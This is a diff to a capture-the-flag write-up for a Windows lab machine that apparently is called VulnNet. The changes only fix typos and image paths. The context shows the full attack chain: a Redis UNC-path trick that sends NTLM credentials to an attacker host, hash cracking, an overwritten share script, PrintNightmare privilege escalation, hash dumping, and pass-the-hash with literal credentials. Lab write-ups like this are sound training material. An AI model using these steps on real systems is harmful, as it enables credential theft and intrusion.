@@ -62,7 +62,7 @@ sudo responder -I tun0 -dwv
 ```
 
 First establish a connection to the  running on the target system. Then change the Redis working directory to a UNC network path hosted on the attacker machine. It forces the window target to access the remote SMB share and automatically send NTLM authentication credentials. 
-the file name (fake.txt) is arbitrary and does not need to exist.
+The file name (fake.txt) is arbitrary and does not need to exist.
 
 ```
 redis-cli -h 10.48.191.231
@@ -73,11 +73,11 @@ Save
 ```
 
 
-![](/assets/image/redis.png)
+![](/assets/image/vulNnet/redis.png)
 
 In Responder, the NTLM hash is captured.
 
-![](/assets/image/ntlm.png)
+![](/assets/image/vulNnet/ntlm.png)
 
 Save the NTLM hash to a file and crack it . I will be using hascat for this instance.
 
@@ -87,7 +87,7 @@ hashcat -m 5600 vulnet.txt /usr/share/wordlists/rockyou.txt -O
 password: sand_0873959498
 ```
 
-![hascat](/assets/image/hashcat.png)
+![hascat](/assets/image/vulNnet/hashcat.png)
 
 
 ## Enumerate shares
@@ -100,7 +100,7 @@ enum4linux -u enterprise-security -p 'sand_0873959498' -a 10.49.146.193
 
 ```
 
-![enumerating shares](/assets/image/shares.png)
+![enumerating shares](/assets/image/vulNnet/shares.png)
 
 The results showed several default administrative and domain-related shares, along with a custom share named **Enterprise-Share** and it is accessible with our low privileged user . 
 The next step is to list the contents of the share with smbclient . I only discovered one file here named  PurgeIrrelevantData_1826.ps1 . 
@@ -152,7 +152,7 @@ put PurgeIrrelevantData_1826.ps1
 
 Soon we will get the connection and navigate to  C:\Users\enterprise-security\Desktop to get the user flag . 
 
-![user flag](/assets/image/user.png)
+![user flag](/assets/image/vulNnet/user.png)
 
 
 ## Privilege Escalation 
@@ -178,7 +178,7 @@ Invoke-Nightmare
 ```
 
 
-![](/assets/image/invoke.png)
+![](/assets/image/vulNnet/invoke.png)
 
 This adds user `adm1n`/`P@ssw0rd` in the local admin group by default. 
 
@@ -187,15 +187,15 @@ This adds user `adm1n`/`P@ssw0rd` in the local admin group by default.
 
 After successfully escalating privileges and obtaining administrative access, using Impacket’s `secretsdump.py `,  I can dump the  **NTLM password hashes** for local and domain accounts . 
 
-![dumping hashes](/assets/image/secretsdump.png)
+![dumping hashes](/assets/image/vulNnet/secretsdump.png)
 
-After extracting the administrator hash instead of cracking it I can perform pass-the-hash attack and authenticate directly as the Administrator using Impacket’s **`wmiexec.py`** . 
+After extracting the administrator hash instead of cracking it. I can perform pass-the-hash attack and authenticate directly as the Administrator using Impacket’s **`wmiexec.py`** . 
 
 ```
 wmiexec.py vulnnet.local/administrator@10.49.146.193 -hashes aad3b435b51404eeaad3b435b51404ee:85d1fadbe37887ed63987f822acb47f1
 ```
 
-last step is navigating to the C:\Users\Administrator\Desktop and getting the root flag . 
+Last step is navigating to the C:\Users\Administrator\Desktop and getting the root flag . 
 
-![root flag](/assets/image/root.png)
+![root flag](/assets/image/vulNnet/root.png)
 
